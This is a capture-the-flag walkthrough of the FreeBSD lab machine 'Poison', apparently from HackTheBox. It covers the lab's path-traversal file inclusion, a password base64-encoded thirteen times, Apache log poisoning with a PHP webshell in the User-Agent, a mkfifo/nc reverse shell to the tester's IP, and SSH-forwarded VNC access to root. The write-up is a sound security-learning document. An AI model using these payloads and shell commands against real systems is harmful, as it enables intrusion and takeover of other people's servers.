#FreeBSD #PHP #LFI #LogPoisoning #base64 #credentialhunting #VNC #SSHtunneling #SSH

## Overview

Poison is a medium FreeBSD box with a classic two-stage web exploitation chain. A PHP file-inclusion parameter on a testing site enables LFI; a plaintext-ish password stored base64-encoded thirteen times is found in a directory listing exposed by the same LFI. Log poisoning turns the LFI into RCE by injecting PHP into the Apache access log through a crafted User-Agent. The user flag comes from SSH with the decoded password. Root is held by a VNC server running as root on localhost; SSH port-forwarding plus a `secret` archive file (encrypted with the user's password) provides the VNC password file to connect.

## Recon

The landing page described itself as "Temporary website to test local .php scripts" with a `Scriptname` text box and a list of test pages. The URL pattern when selecting any page:

```
http://10.129.1.254/browse.php?file=listfiles.php
```

`listfiles.php` returned an array of files in the directory:

```
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php
        [4] => info.php [5] => ini.php [6] => listfiles.php
        [7] => phpinfo.php [8] => pwdbackup.txt )
```

`pwdbackup.txt` was unexpected. Entering it in the Scriptname box returned a large base64 blob with a comment: "This password is secure, it's encoded atleast 13 times."

`phpinfo.php` confirmed `allow_url_include = Off`, ruling out direct RFI.

## Foothold

### LFI Confirmed

```sh
http://10.129.1.254/browse.php?file=../../../../../../../etc/passwd
```

Success, the full FreeBSD `/etc/master.passwd` content was returned, revealing user `charix` at UID 1001.

### Decoding the Password

The blob in `pwdbackup.txt` was base64-decoded iteratively 13 times:

```sh
data=$(cat pwd.b64)
for i in $(seq 1 13); do
  data=$(echo $data | tr -d ' ' | base64 -d)
done
echo $data
‹redacted›
```

### Log Poisoning → RCE as www

LFI gives read access to Apache's access log. By injecting PHP into the `User-Agent` header, that PHP gets written into the log file. Subsequent LFI requests to the log file execute the injected code:

```
GET / HTTP/1.1
User-Agent: Firefox: <?php system($_GET['c']); ?>
```

After sending that request, reading the log via LFI with a `c` parameter:

```
http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&c=id
```

Output at the bottom of the log:

```
10.10.14.92 - - [18/Sep/2024:18:50:46 +0200] "GET / HTTP/1.1" 200 289 "-" "Firefox: uid=80(www) gid=80(www) groups=80(www)
```

> **Why log poisoning works:** the PHP interpreter evaluates `<?php system($_GET['c']); ?>` whenever it appears in a file that is `include()`d or `file_get_contents()`d. The access log is a plain text file that records every request including headers. By poisoning the log with PHP code via the User-Agent, any subsequent LFI that reads the log file triggers execution. The log must be in a path PHP can include, and the webserver must have PHP processing enabled for the include path.

`nc -e` was not available on FreeBSD's default `nc`. The mkfifo pipe trick worked:

```sh
http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.92%2053%20%3E/tmp/f
```

```sh
rlwrap nc -lvnp 53
connect to [10.10.14.92] from (UNKNOWN) [10.129.1.254] 62885
$ whoami
www
```

### SSH as charix

The decoded password worked directly over SSH:

```sh
ssh charix@10.129.1.254
# Password: ‹redacted›
charix@Poison:~ % whoami
charix
```

## Privilege Escalation

### VNC Running as Root on Localhost

`ps aux` showed a TightVNC server on display `:1` (port 5901) running as root:

```sh
root    608  Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes \
  -auth /root/.Xauthority -geometry 1280x800 -depth 24 \
  -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost
```

VNC was listening only on localhost, so direct connection from Kali was blocked.

### Recovering the VNC Password File

`charix`'s home directory contained `secret.zip`. It transferred back to Kali via FTP (a Python `pyftpdlib` server on Kali, then `ftp put` from the box):

```sh
# Kali
python -m pyftpdlib -p 21 -w

# Target
ftp 10.10.14.92
ftp> put secret.zip
```

Unzipping with the charix password:

```sh
unzip -P '‹redacted›' secret.zip
# extracts: secret
```

`secret` is a binary VNC password file.

### SSH Port Forwarding + VNC Authentication as Root

```sh
ssh -N -L 34500:127.0.0.1:5901 charix@10.129.1.254
```

```sh
vncviewer 127.0.0.1::34500 -passwd secret
# Authentication successful
# Desktop name "root's X desktop (Poison:1)"
```

> **Why the `secret` file works as the VNC password:** VNC stores the connection password as a fixed-key DES encrypted binary (same weakness as in Cascade). The `secret` file is that encrypted binary in exactly the format `vncviewer -passwd` expects. No cracking needed; it's passed directly as the credential material.

## Root

VNC connected as root's desktop. Box rooted through the graphical session.

## Takeaways

- **LFI + access log = RCE.** Inject PHP into any log the server reads via `include()`. The User-Agent header is the cleanest injection point because it's always logged and allows arbitrary characters.
- **Thirteen rounds of base64 is still reversible in a loop.** Obfuscation by encoding depth is not security; a one-liner unwraps it.
- **Processes listening on localhost are still reachable via SSH port forwarding.** Any service bound to `127.0.0.1` on a box where you have SSH is effectively accessible from your attacker machine.
- **VNC password files are DES-encrypted with a static key.** A `-passwd` file can be used directly by `vncviewer` without decrypting it; finding the file is the same as finding the password.
